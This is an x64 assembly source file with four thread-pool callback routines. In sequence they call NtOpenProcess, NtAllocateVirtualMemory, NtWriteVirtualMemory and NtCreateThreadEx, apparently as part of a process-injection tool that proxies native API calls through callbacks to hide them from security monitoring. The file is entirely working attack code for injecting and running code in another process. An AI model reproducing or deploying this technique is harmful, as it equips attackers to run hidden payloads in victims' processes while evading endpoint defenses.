.code

    WorkCallback1 PROC
        mov rbx, rdx                 ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]               ; NtOpenProcess
        mov rcx, [rbx + 8h]          ; HANDLE ProcessHandle
        mov rdx, [rbx + 10h]         ; ACCESS_MASK AccessMask
        mov r8, [rbx + 18h]          ; POBJECT_ATTRIBUTES oa e
        mov r9, [rbx + 20h]          ; PCLIENT_ID cid
        jmp rax
    WorkCallback1 ENDP

    WorkCallback2 PROC
        mov rbx, rdx                 ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]               ; NtAllocateVirtualMemory
        mov rcx, [rbx + 8h]          ; HANDLE ProcessHandle
        mov rdx, [rbx + 10h]         ; PVOID *BaseAddress
        xor r8, r8                   ; ULONG_PTR ZeroBits
        mov r9, [rbx + 18h]          ; PSIZE_T RegionSize
        mov r10, [rbx + 20h]         ; ULONG Protect
        mov [rsp + 30h], r10         ; stack pointer for 6th arg
        mov r10, 3000h               ; ULONG AllocationType
        mov [rsp + 28h], r10         ; stack pointer for 5th arg
        jmp rax
    WorkCallback2 ENDP

    WorkCallback3 PROC
        mov rbx, rdx                 ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]               ; NtWriteVirtualMemory
        mov rcx, [rbx + 8h]          ; HANDLE ProcessHandle
        mov rdx, [rbx + 10h]         ; PVOID *address
        mov r8, [rbx + 18h]          ; PVOID *buffer
        mov r9, [rbx + 20h]          ; ULONG NumberOfBytesToWrite
        mov r10, [rbx + 28h]         ; PULONG NumberOfBytesWritten
        mov [rsp + 28h], r10         ; stack pointer for 6th arg
        jmp rax
    WorkCallback3 ENDP

    WorkCallback4 PROC
        mov rbx, rdx                 ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]               ; NtCreateThreadEx
        mov rcx, [rbx + 8h]          ; HANDLE hThread
        mov rdx, 40000000h           ; GENERIC_EXECUTE
        xor r8, r8                   ; ObjectAttributes
        mov r9, [rbx + 10h]          ; HANDLE hProcess
        mov r10, [rbx + 18h]         ; PVOID *address
        mov [rsp + 28h], r10         ; stack pointer for 5th arg
        xor r10, r10                 ; zero
        mov [rsp + 30h], r10         ; stack pointer for 6th arg
        mov [rsp + 38h], r10         ; stack pointer for 7th arg
        mov [rsp + 40h], r10         ; stack pointer for 8th arg
        mov [rsp + 48h], r10         ; stack pointer for 9th arg
        mov [rsp + 50h], r10         ; stack pointer for 10th arg
        mov [rsp + 58h], r10         ; stack pointer for 11th arg
        jmp rax
    WorkCallback4 ENDP

end